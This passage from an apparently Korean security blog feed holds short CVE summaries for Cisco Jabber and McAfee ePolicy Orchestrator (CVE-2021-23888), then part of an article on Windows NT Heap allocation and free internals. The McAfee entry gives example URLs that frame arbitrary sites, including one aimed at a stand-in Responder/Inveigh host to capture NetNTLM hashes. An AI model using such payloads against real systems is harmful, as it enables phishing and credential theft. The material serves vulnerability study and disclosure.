&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC778; Cisco Jabber&#xC5D0;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xBC0F; &#xC784;&#xC758; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589;, &#xC815;&#xBCF4; &#xC720;&#xCD9C;(Information Disclosure), &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD328;&#xD0B7; intercept, DoS &#xACF5;&#xACA9; &#xB4F1; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC01; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC11C;&#xB85C; &#xC5F0;&#xAD00;&#xC131;&#xC774; &#xC5C6;&#xC73C;&#xBA70; &#xD558;&#xB098;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xBC84;&#xC804;&#xC774;&#xB77C;&#xB3C4; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;&#xC5D4; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Certificate Validation&#xC744; &#xC81C;&#xC678;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC740; Cisco Jabber&#xC758; &#xC798;&#xBABB;&#xB41C; &#xBA54;&#xC2DC;&#xC9C0; content &#xAC80;&#xC99D;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xB294; &#xC870;&#xC791;&#xB41C; <a href="https://ko.wikipedia.org/wiki/XMPP">XMPP</a> &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD0C0;&#xAE43; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB97C; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589;&#xC744; &#xD558;&#xAC70;&#xB098;, &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC778;&#xC99D; &#xC815;&#xBCF4;&#xB97C; &#xBC1B;&#xC544; &#xC624;&#xAC70;&#xB098; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80; &#xACF5;&#xACA9;(Denial of Service)&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC5D0; &#xB300;&#xD55C; &#xC798;&#xBABB;&#xB41C; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB85C; &#xC778;&#xD558;&#xC5EC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; request&#xB97C; &#xAC00;&#xB85C;&#xCC44; &#xC870;&#xC791;&#xB41C; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xD1B5;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xC11C;&#xBC84; &#xAC04;&#xC758; &#xC5F0;&#xACB0;&#xC744; &#xD655;&#xC778;&#xD558;&#xAC70;&#xB098; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>cisco</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-23888: McAfee ePolicy Orchestrator HTML Injection</title>
    <link href="/2021/03/28/insu/2021-03-28/"/>
    <url>/2021/03/28/insu/2021-03-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ricardojba.github.io/CVE-2021-23888-McAfee-ePolicy-Orchestrator-HTML-Injection/">CVE-2021-23888 - McAfee ePolicy Orchestrator HTML Injection</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>McAfee ePolicy Orchestrator</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>McAfee ePolicy Orchestrator 5.10 Update 10 &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xAC80;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; client &#xCE21; URL redirect &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xB41C; ePO &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xC2E0;&#xB8B0;&#xB418;&#xC9C0; &#xC54A;&#xC740; ePO IFRAME&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xC5EC; &#xC778;&#xC99D;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xB3C4;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>epo-host:<span class="hljs-number">8443</span><span class="hljs-regexp">/core/</span>orionNavigationLogin.<span class="hljs-keyword">do</span><span class="hljs-comment">#/core/orionDefaultPage.do</span></code></pre><p>&#xC704;&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xC811;&#xADFC;&#xC744; &#xD558;&#xAC8C; &#xB418;&#xBA74; <code>/core/orionDefaultPage.do</code>&#xAC00; IFRAME &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xB7EC; &#xC2DC;&#xB3C4;&#xB97C; &#xD1B5;&#xD574; <a href="https://epo-host:8443/core/orionNavigationLogin.do#//google.com"><code>https://epo-host:8443/core/orionNavigationLogin.do#//google.com</code></a> google search page&#xB97C; IFRAME&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; <code>#</code> &#xB4A4;&#xC758; domain/URL&#xC744; &#xBC14;&#xAFB8;&#xC5B4; victim&#xC5D0;&#xAC8C; &#xBCF4;&#xB0B4; &#xD53C;&#xC2F1; &#xACF5;&#xACA9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/28/insu/2021-03-28/Untitled.png" alt></p><p>&#xB610;&#xD55C;, host&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; Responder-or-Inveigh&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xD574; ePO &#xC0AC;&#xC6A9;&#xC790;&#xC758; NetNTM &#xD574;&#xC2DC;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>epo-host:<span class="hljs-number">8443</span><span class="hljs-regexp">/core/</span>orionNavigationLogin.<span class="hljs-keyword">do</span><span class="hljs-comment">#//host-running-responder-or-inveigh</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>cve</tag>
      
      <tag>mcafee</tag>
      
      <tag>html injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 3 - NT Heap(2)</title>
    <link href="/2021/03/28/l0ch/pwncoolsexy-part3/"/>
    <url>/2021/03/28/l0ch/pwncoolsexy-part3/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xC774;&#xC804;-&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC774;&#xC804;-&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC774;&#xC804; &#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC774;&#xC804; &#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 1 - pwntools for windows</a></p><p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn&#xD558;&#xACE0; Cool&#xD558;&#xACE0; Sexy&#xD55C; Windows &#xD0D0;&#xBC29;&#xAE30; Part 2 - NT Heap</a></p><hr><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xC9C0;&#xB09C; &#xD3F0;&#xCFE8;&#xC139;&#xC2DC; &#xC2DC;&#xB9AC;&#xC988;&#xC5D0; &#xC774;&#xC5B4; &#xC624;&#xB298;&#xB3C4; &#xC708;&#xB3C4;&#xC6B0;&#xC5D0; &#xACE0;&#xD1B5;&#xBC1B;&#xACE0; &#xC788;&#xB294; L0ch&#xC785;&#xB2C8;&#xB2E4;! </p><p>&#xC2DC;&#xC791;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xADFC;&#xD669; &#xC598;&#xAE30;&#xB97C; &#xC870;&#xAE08; &#xD558;&#xC790;&#xBA74; &#xC81C; &#xD504;&#xB85C;&#xD544; &#xC0AC;&#xC9C4;&#xC774; &#xAC70;&#xC9C0; &#xAC19;&#xC544;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB2C8; &#xBE44;&#xC720;&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xB9D0; &#xADF8;&#xB300;&#xB85C;&#xC694;&#x2026; </p><p>&#xC5B4;&#xB290; &#xB0A0; idioth &#xD300;&#xC7A5;&#xD615;(&#xC774;&#xB77C; &#xC4F0;&#xACE0; &#xB3C5;&#xC7AC;&#xC790;&#xB77C;&#xACE0; &#xC77D;&#xB294;&#xB2E4;)&#xC774; &#xAE09;&#xD558;&#xAC8C; &#xBD80;&#xB974;&#xAE38;&#xB798; &#xBB34;&#xC2A8; &#xC77C;&#xC778;&#xAC00; &#xD588;&#xB354;&#xB2C8;</p><blockquote><p>&#x201C;&#xC57C; &#xB108; &#xC9C0;&#xAE08; &#xD504;&#xB85C;&#xD544; &#xC0AC;&#xC9C4; &#xBCC4;&#xB85C;&#xB2E4; &#xB0B4;&#xAC00; &#xC0C8;&#xB85C; &#xADF8;&#xB824;&#xC904;&#xAE4C;?&#x201D;<br>&#x201C;&#x3134;&#x3134; &#xB098; &#xC9C0;&#xAE08; &#xB9C8;&#xC74C;&#xC5D0; &#xB4DC;&#xB294;&#xB370;&#x201D;<br>&#x201C;&#xB0B4;&#xAC00; &#xB9C8;&#xC74C;&#xC5D0; &#xC548; &#xB4E4;&#xC5B4; &#xAE30;&#xB2E4;&#xB824;&#xBD10;&#x314B;&#x201D;<br>(10&#xBD84; &#xB4A4;)</p></blockquote><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled.png" alt="pwncoolsexy-part3/Untitled.png"></p><blockquote><p>&#x201C;?&#x201D;<br>&#x201C;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xC774;&#xAC78;&#xB85C; &#xD568; &#xD300;&#xC7A5; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC758;&#xACAC;&#xC740; &#xC548; &#xBC1B;&#xC74C; &#x3145;&#x3131;&#x201D;<br>&#x201C;tq&#x201D;</p></blockquote><p>&#xD300;&#xC7A5;&#xC758; &#xAD8C;&#xB825;&#xB0A8;&#xC6A9;&#xC73C;&#xB85C; &#xC81C; &#xC758;&#xACAC;&#xC740; &#xB2E8; 1&#xB3C4; &#xC5C6;&#xC774; &#xD504;&#xB85C;&#xD544; &#xC0AC;&#xC9C4;&#xC744; &#xBCC0;&#xACBD;&#xB2F9;&#xD588;&#xC5B4;&#xC694;. &#xB9C8;&#xB978;&#xD558;&#xB298;&#xC5D0; &#xC6EC; &#xB0A0;&#xBCBC;&#xB77D;&#xC774;&#xC9C0; &#xC774;&#xAC8C;</p><p>&#xC54C;&#xACE0; &#xBCF4;&#xB2C8; &#xC800;&#xB9CC; &#xB2F9;&#xD55C; &#xAC8C; &#xC544;&#xB2C8;&#xC5C8;&#xB354;&#xB77C;&#xAD6C;&#xC694; &#x314B;.&#x314B;  &#xC774; &#xD615; &#xC6B0;&#xB9AC; &#xB180;&#xB9AC;&#xB824;&#xACE0; &#xD574;&#xD0B9;&#xD558;&#xB294; &#xAC8C; &#xBD84;&#xBA85;&#xD574;..</p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%201.png" alt="pwncoolsexy-part3/Untitled%201.png"></p><blockquote><p>&#x3139;&#x3147; &#xB611;&#xAC19;&#xC774; &#xADF8;&#xB824;&#xC11C; &#xB354; &#xBD84;&#xD558;&#xB2E4;</p></blockquote><p>&#xC774;&#xB807;&#xAC8C; &#xB610; &#xD300;&#xC7A5; &#xC8FD;&#xCC3D; 1&#xC2A4;&#xD0DD;&#xC744; &#xC313;&#xC73C;&#xBA70; &#xC4F4; &#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; Part 2&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD55C; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; NT Heap&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xC368;&#xBA39;&#xC73C;&#xBA74;&#xC11C; Heap &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xD574;&#xC81C;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.. </p><h1 id="Allocate-in-NT-Heap"><a href="#Allocate-in-NT-Heap" class="headerlink" title="Allocate in NT Heap"></a>Allocate in NT Heap</h1><p>Heap &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xC694;&#xCCAD;&#xC774; &#xB4E4;&#xC5B4;&#xC624;&#xBA74; NT Heap&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xB3D9;&#xC791;&#xC740; <code>RtlpAllocateHeap</code>&#xC5D0;&#xC11C; &#xC694;&#xCCAD; &#xD06C;&#xAE30;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC138; &#xAC00;&#xC9C0;&#xB85C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;.</p><ul><li>Size &#x2264; 0x4000</li><li>0x4000 &lt; Size &#x2264; 0xff000</li><li>Size &gt; 0xff000</li></ul><p><code>0xff000</code>&#xC740; <code>_Heap-&gt;VirtualMemoryThreshold &lt;&lt; 4</code> &#xC758; &#xAC12;&#xC774;&#xBA70; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xAE30;&#xC900;&#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; LFH&#xB294; &#xD06C;&#xAE30;&#xAC00; <code>0x4000</code> &#xC774;&#xD558;&#xC778; chunk&#xB9CC; &#xAD00;&#xB9AC;&#xD55C;&#xB2E4;&#xACE0; &#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD588;&#xC5C8;&#xC8E0;? &#xADF8;&#xB798;&#xC11C; Non-LFH&#xC640; LFH&#xC758; &#xD560;&#xB2F9; &#xBC29;&#xC2DD;&#xC758; &#xCC28;&#xC774;&#xB294; &#xD06C;&#xAE30;&#xAC00; <code>0x4000</code>&#xC77C; &#xB54C;&#xB9CC; &#xACE0;&#xB824;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="Size-&#x2264;-0x4000"><a href="#Size-&#x2264;-0x4000" class="headerlink" title="Size &#x2264; 0x4000"></a>Size &#x2264; 0x4000</h2><p>&#xC694;&#xCCAD; &#xD06C;&#xAE30;&#xAC00; <code>0x4000</code>&#xBCF4;&#xB2E4; &#xC791;&#xC73C;&#xBA74; &#xBA3C;&#xC800; LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD55C; &#xB4A4; &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xC5D0; &#xB530;&#xB77C; &#xD560;&#xB2F9; &#xBC29;&#xBC95;&#xC744; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="LFH-Disabled"><a href="#LFH-Disabled" class="headerlink" title="LFH Disabled"></a>LFH Disabled</h3><ol><li>LFH&#xAC00; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP">_HEAP-&gt;FrontEndHeapUsageData</a>&#xC5D0; <code>0x21</code>&#xC744; &#xB354;&#xD55C; &#xB4A4;, &#xD574;&#xB2F9; &#xAC12;&#xC774; <code>0xff00</code> &#xB610;&#xB294; <code>(&amp; 0x1f)</code>&#xACB0;&#xACFC;&#xAC00; <code>0x10</code> &#xBCF4;&#xB2E4; &#xD070;&#xC9C0; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.<ul><li>&#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xBA74; LFH&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD574; &#xB2E4;&#xC74C; chunk&#xBD80;&#xD130;&#xB294; LFH&#xB85C; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xBA3C;&#xC800; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LIST-LOOKUP">_HEAP_LIST_LOOKUP-&gt;ListHint</a>&#xC5D0; &#xC694;&#xCCAD;&#xB41C; &#xD06C;&#xAE30;&#xC758; chunk&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC801;&#xC808;&#xD55C; &#xD06C;&#xAE30;&#xC758; ListHint&#xAC00; &#xC788;&#xC73C;&#xBA74; chunk&#xB97C; &#xAC00;&#xC838;&#xC640; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC801;&#xC808;&#xD55C; &#xD06C;&#xAE30;&#xC758; chunk&#xAC00; &#xC5C6;&#xC73C;&#xBA74; &#xC694;&#xCCAD;&#xB41C; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xB354; &#xD070; &#xD06C;&#xAE30;&#xC758; ListHint&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628; chunk&#xB97C; &#xBD84;&#xD560;&#xD558;&#xACE0;, &#xBD84;&#xD560;&#xD558;&#xACE0; &#xB0A8;&#xC740; chunk&#xB97C; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY">FreeList</a>&#xC5D0; &#xC0BD;&#xC785;&#xD558;&#xACE0; ListHint&#xC5D0; &#xB123;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>FreeList&#xC5D0; &#xC801;&#xC808;&#xD55C; chunk&#xAC00; &#xC5C6;&#xC73C;&#xBA74; <code>ExtendHeap</code>&#xC73C;&#xB85C; Heap space&#xB97C; &#xD655;&#xC7A5;&#xD574; chunk&#xB97C; &#xAC00;&#xC838;&#xC640; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><h3 id="LFH-Enabled"><a href="#LFH-Enabled" class="headerlink" title="LFH Enabled"></a>LFH Enabled</h3><p>LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C;&#xB294; <code>RtlpLowFragHeapAllocFromContext</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xACFC;&#xC815;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;.</p><ol><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LOCAL-SEGMENT-INFO">_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment</a>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; Subsegment&#xC758; depth&#xB97C; &#xD655;&#xC778;&#xD574; &#xD560;&#xB2F9; &#xAC00;&#xB2A5;&#xD55C; chunk&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xBCF4;&#xACE0;, &#xC5C6;&#xC73C;&#xBA74; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LOCAL-SEGMENT-INFO">_HEAP_LOCAL_SEGMENT_INFO-&gt;CachedItems</a> &#xC5D0;&#xC11C; &#xAC80;&#xC0C9;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>CachedItems</code>&#xC5D0;&#xC11C; &#xAC80;&#xC0C9;&#xD55C; &#xACBD;&#xC6B0; <code>ActiveSubsegment</code>&#xB97C; <code>CachedItem</code>&#xC758; Subsegment&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.</li><li><code>_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment-&gt;AggregateExchg-&gt;Depth</code> &#xAC12;&#xC744; 1 &#xAC10;&#xC18C;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>0x0-0x7f</code> &#xC0AC;&#xC774;&#xC758; &#xB79C;&#xB364; &#xAC12;&#xB4E4;&#xB85C; &#xCC44;&#xC6CC;&#xC9C4; 256 bytes &#xBC30;&#xC5F4;&#xC778; <code>RtlpLowFragHeapRandomData[x]</code> &#xC5D0;&#xC11C; &#xC784;&#xC758;&#xC758; 1 bytes &#xAC12;&#xC744; &#xC77D;&#xC5B4; Heap chunk&#xC758; &#xC778;&#xB371;&#xC2A4;&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</li><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_USERDATA_HEADER-&gt;BusyBitmap</a> &#xBE44;&#xD2B8;&#xB9F5;&#xC5D0;&#xC11C; &#xC77D;&#xC5B4;&#xC628; &#xC778;&#xB371;&#xC2A4; &#xC704;&#xCE58;&#xC5D0; chunk&#xB97C; &#xD560;&#xB2F9;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xD560;&#xB2F9;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xBA74; &#xC778;&#xC811;&#xD55C; &#xC704;&#xCE58;&#xC758; &#xB2E4;&#xB978; index&#xB97C; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><h2 id="0x4000-lt-Size-&#x2264;-0xff000"><a href="#0x4000-lt-Size-&#x2264;-0xff000" class="headerlink" title="0x4000 &lt; Size &#x2264; 0xff000"></a>0x4000 &lt; Size &#x2264; 0xff000</h2><p>LFH&#xAC00; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB41C; <code>0x4000</code> &#xC774;&#xD558; &#xD06C;&#xAE30;&#xC758; &#xD560;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC640; &#xB3D9;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;. &#xAC04;&#xB2E8;&#xD558;&#xC8E0;? </p><h2 id="Size-gt-0xff000"><a href="#Size-gt-0xff000" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h2><p>&#xC694;&#xCCAD; &#xC0AC;&#xC774;&#xC988;&#xAC00; <code>0xff000</code>&#xBCF4;&#xB2E4; &#xD074; &#xACBD;&#xC6B0; <code>ZwAllocateVirtualMemory()</code>&#xB77C;&#xB294; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xBA70;, &#xD574;&#xB2F9; chunk&#xB294; <code>_HEAP_ENTRY</code> &#xB300;&#xC2E0; <code>_HEAP_VIRTUAL_ALLOC_ENTRY</code> &#xAD6C;&#xC870;&#xCCB4;&#xAC00; header&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. </p><h1 id="Free-in-NT-Heap"><a href="#Free-in-NT-Heap" class="headerlink" title="Free in NT Heap"></a>Free in NT Heap</h1><p>Free &#xD560; &#xB54C;&#xB294; chunk &#xD06C;&#xAE30;&#xC5D0; &#xB530;&#xB77C; &#xB450; &#xAC00;&#xC9C0;&#xB85C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;.</p><ul><li>Size &#x2264; 0xff000</li><li>Size &gt; 0xff000</li></ul><h2 id="Size-&#x2264;-0xff000"><a href="#Size-&#x2264;-0xff000" class="headerlink" title="Size &#x2264; 0xff000"></a>Size &#x2264; 0xff000</h2><p>&#xBA3C;&#xC800; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-ENTRY">_HEAP_ENTRY-&gt;UnusedBytes</a> &#xC5D0;&#xC11C; &#xD574;&#xB2F9; chunk&#xAC00; LFH&#xB85C; &#xAD00;&#xB9AC;&#xB418;&#xACE0; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="LFH-Disabled-1"><a href="#LFH-Disabled-1" class="headerlink" title="LFH Disabled"></a>LFH Disabled</h3><ol><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-ENTRY">_HEAP-&gt;FrontEndHeapUsageData</a> &#xAC12;&#xC744; 1 &#xAC10;&#xC18C;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xC804; &#xD639;&#xC740; &#xB2E4;&#xC74C; chunk&#xAC00; free &#xB41C; &#xC0C1;&#xD0DC;&#xBA74; free &#xD560; &#xD574;&#xB2F9; chunk&#xC640; &#xBCD1;&#xD569;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xBCD1;&#xD569;&#xD55C; chunk&#xB97C; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY">_HEAP_ENTRY-&gt;FreeList</a>&#xC758; &#xC2DC;&#xC791; &#xD639;&#xC740; &#xB05D;&#xC5D0; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC0BD;&#xC785; &#xAC00;&#xB2A5;&#xD558;&#xBA74; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY">_HEAP_ENTRY-&gt;FreeList</a>&#xC5D0;, &#xC544;&#xB2C8;&#xB77C;&#xBA74; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LIST-LOOKUP">_HEAP_LIST_LOOKUP-&gt;ListHint</a>&#xC5D0; chunk&#xB97C; &#xC0BD;&#xC785;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><h3 id="LFH-Enabled-1"><a href="#LFH-Enabled-1" class="headerlink" title="LFH Enabled"></a>LFH Enabled</h3><ol><li>header&#xB97C; &#xB514;&#xCF54;&#xB529;&#xD574; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_USERDATA_HEADER</a> &#xC640; <a 